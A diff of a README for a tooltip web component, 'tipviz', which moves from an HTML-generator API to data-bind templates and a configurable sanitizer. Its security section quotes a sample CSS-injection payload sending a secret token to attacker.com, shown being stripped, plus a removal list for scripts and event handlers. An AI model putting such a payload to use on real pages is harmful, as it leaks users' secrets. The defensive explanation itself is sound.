@@ -51,22 +51,28 @@ import "tipviz";
 ```ts
 const tooltip = document.getElementById("tooltip");
 
-// 1. Set the HTML content (receives the data passed to show())
-tooltip.setHtml((data) => `<div>${data.label}: ${data.value}</div>`);
+// 1. Define the HTML template with data-bind placeholders
+tooltip.setTemplate(`<div data-bind="label">: </div><span data-bind="value"></span>`);
 
-// 2. Optional: set a fixed direction or compute it dynamically
+// 2. Set the dynamic data (can be updated independently of show())
+tooltip.setData({ label: "Score", value: 42 });
+
+// 3. Optional: set a fixed direction or compute it dynamically
 tooltip.setDirection(() => "n"); // "n" | "s" | "e" | "w" | "nw" | "ne" | "sw" | "se"
 
-// 3. Optional: shift position by [x, y] pixels (x→left, y→top)
+// 4. Optional: shift position by [x, y] pixels (x→left, y→top)
 tooltip.setOffset(() => [0, 8]);
 
-// 4. Optional: CSS string (uses CSSStyleSheet with <style> fallback)
+// 5. Optional: CSS string (uses CSSStyleSheet with <style> fallback)
 tooltip.setStyles(`
   .tipviz-tooltip { background: rgba(0,0,0,0.85); color: white; padding: 6px; border-radius: 4px; }
 `);
 
-// 5. Show / hide on interaction
-element.addEventListener("mouseenter", (e) => tooltip.show(someData, e.currentTarget));
+// 6. Show / hide on interaction — show() only needs the target element
+element.addEventListener("mouseenter", (e) => {
+  tooltip.setData({ label: "Score", value: 42 });
+  tooltip.show(e.currentTarget);
+});
 element.addEventListener("mouseleave", () => tooltip.hide());
 ```
 
@@ -78,13 +84,14 @@ element.addEventListener("mouseleave", () => tooltip.hide());
 
 | Method | Signature | Description |
 |--------|----------|-------------|
-| `setHtml` | `(fn: (data, target) => string) => void` | Sets the HTML content generator |
+| `setTemplate` | `(html: string) => void` | Parses HTML and caches `[data-bind]` refs |
+| `setData` | `(data: Record<string, string\|number>) => void` | Updates bound elements via `data-bind` keys |
 | `setDirection` | `(fn: (data, target) => Direction) => void` | Sets the placement direction |
 | `setOffset` | `(fn: (data, target) => [x, y]) => void` | Sets pixel offset `[x, y]` |
-| `setSanitizer` | `(fn: SanitizerFn \| null) => void` | Overrides HTML sanitization (see Security section) |
 | `setStyles` | `(css: string) => void` | Applies CSS via adoptedStyleSheets |
 | `loadStylesheet` | `(url: string) => void` | Injects a `<link>` into shadow root |
-| `show` | `(data: object, target: Element) => void` | Renders and positions the tooltip |
+| `setSanitizerConfig` | `(config: SanitizerConfig) => void` | Overrides the sanitization config |
+| `show` | `(target: Element) => void` | Positions and reveals the tooltip |
 | `hide` | `() => void` | Hides the tooltip |
 
 ### Attributes
@@ -157,20 +164,18 @@ The component includes automatic HTML sanitization to prevent XSS and CSS inject
 ```ts
 // ❌ This WILL NOT leak data:
 const malicious = `<div style="background: url(https://attacker.com/steal?secret=TOKEN)">x</div>`;
-tooltip.setHtml(() => malicious);
+tooltip.setTemplate(malicious);
 // Sanitized to: `<div style="background: url()">x</div>` — no network request
 ```
 
 **To override sanitization (trusted HTML only):**
 
 ```ts
-import { sanitize } from "tipviz";
-
-// Use a custom sanitizer
-tooltip.setSanitizer((html) => sanitize(html));
-
-// Or disable sanitization entirely (trusted content only!)
-tooltip.setSanitizer(null);
+// Allow <b> and <i> elements through
+tooltip.setSanitizerConfig({
+  removeElements: ["script", "iframe"],
+  removeAttributes: [/^on\S+$/i, "srcdoc", "formaction"]
+});
 ```
 
 ---
@@ -183,7 +188,7 @@ import "tipviz";
 
 const tooltip = document.getElementById("tooltip") as TipVizTooltip;
 
-tooltip.setHtml(({ x, y }) => `<div>X: ${x} &nbsp; Y: ${y}</div>`);
+tooltip.setTemplate(`<div>X: <span data-bind="x"></span> &nbsp; Y: <span data-bind="y"></span></div>`);
 tooltip.setStyles(`
   .tipviz-tooltip { background: rgba(0,0,0,0.85); color: white; padding: 6px; border-radius: 4px; font-size: 13px; }
 `);
@@ -196,7 +201,10 @@ d3.select("#chart")
   .attr("cy", (d) => d.y)
   .attr("r", 8)
   .attr("fill", "steelblue")
-  .on("mouseenter", (e, d) => tooltip.show(d, e.currentTarget))
+  .on("mouseenter", (e, d) => {
+    tooltip.setData({ x: String(d.x), y: String(d.y) });
+    tooltip.show(e.currentTarget);
+  })
   .on("mouseleave", () => tooltip.hide());
 ```
 
@@ -207,5 +215,5 @@ d3.select("#chart")
 - The tooltip uses `window.scrollY`/`window.scrollX` for positioning and auto-moves itself to `document.body` on connect (opt out with `no-auto-reposition`).
 - Default direction is `"n"` (above the target).
 - Default transition duration is `200ms`.
-- HTML content is automatically sanitized by default (removes dangerous elements, event handlers, and blocks CSS URL injection). Override via `setSanitizer()` if needed.
+- HTML content is automatically sanitized by default (removes dangerous elements, event handlers, and blocks CSS URL injection). Override via `setSanitizerConfig()` if needed.
 - All `url()` calls in inline `style` attributes are stripped to prevent CSS-based attacks.
